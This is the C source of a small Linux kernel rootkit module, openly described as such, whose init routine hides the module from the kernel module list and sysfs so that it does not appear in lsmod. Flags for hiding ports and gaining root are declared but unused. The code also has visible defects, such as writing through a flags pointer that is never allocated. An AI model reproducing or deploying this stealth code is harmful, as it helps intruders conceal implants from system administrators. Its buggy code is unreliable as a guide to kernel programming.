/*----------------------------------------------------
Name:   bantikit.c
Date:   2015.05.12
Auth:   Sun Dro (a.k.a. 7th Ghost / kala13x)
Desc:   Kernel Based RootKit Module
----------------------------------------------------*/


#include "stdinc.h"

/*---------------------------------------------
| Flags of banti module
---------------------------------------------*/
typedef struct { 
    short module_hidden;
    short port_hiden;
    short is_root;
} BantiFlags;


/* Public variables */
static BantiFlags *fl;
static struct list_head *module_prev;
static struct list_head *module_kobj_prev;


/*---------------------------------------------
| Initialise bantikit flags
---------------------------------------------*/
void init_banti(void) 
{
    fl->module_hidden = 0;
    fl->port_hiden = 0;
    fl->is_root = 0;
}


/*---------------------------------------------
| Hide module
---------------------------------------------*/
void banti_module_hide(void)
{
    /* Check if alredy hided */
    if (fl->module_hidden) return;

    /* Delete in module list */
    module_prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

    /* Reinitialise list */
    module_kobj_prev = THIS_MODULE->mkobj.kobj.entry.prev;
    kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);

    /* Flag up */
    fl->module_hidden = 1;
}


/*---------------------------------------------
| Make module visible
---------------------------------------------*/
void banti_module_show(void)
{
    int result;
    
    /* Check if alredy hided */
    if (!fl->module_hidden) return;

    /* Add module in list */
    list_add(&THIS_MODULE->list, module_prev);
    result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");

    /* Flag down */
    fl->module_hidden = 0;
}

/*---------------------------------------------
| Initialise rootkit module
---------------------------------------------*/
static int __init banti_kit_init(void)
{
    /* Hide module */
    init_banti();
    banti_module_hide();

    /* Debug log */
    printk(KERN_INFO "Loades banti module\n");
    return 0;
}


/*---------------------------------------------
| Clean rootkit module
---------------------------------------------*/
static void __exit banti_kit_clean(void)
{
    printk(KERN_INFO "Unloaded banti module\n");
}


/*---------------------------------------------
| Module initialisations
---------------------------------------------*/
module_init(banti_kit_init);
module_exit(banti_kit_clean);
MODULE_LICENSE(DRIVER_LICENSE);